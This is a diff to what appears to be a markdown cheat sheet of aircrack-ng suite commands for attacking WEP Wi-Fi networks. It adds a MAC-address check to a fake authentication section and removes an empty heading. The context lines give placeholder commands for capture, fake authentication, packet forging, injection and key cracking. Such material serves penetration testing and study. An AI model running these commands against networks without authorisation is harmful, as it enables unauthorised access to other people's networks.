@@ -2,6 +2,7 @@
 ## Fake Authentication Attack
    
    airmon-ng start <interface> <AP channel>
+   macchanger --show <interface> 
    airodump-ng -c <AP Channel> --bssid <AP MAC> -w <capture> <interface>
    aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface name>
    
@@ -53,8 +54,6 @@
    packetforge-ng -0 -a <AP MAC> -h <Your MAC> -l <Source IP> -k <Dest IP> -y <xor filename> -w <output filename>
    aireplay-ng -2 -r <packet filename> <interface>
    aircrack-ng <capture>
-
-## Aircrak-ng
 
 
 ## Bypassing WEP Shared Key Authentication
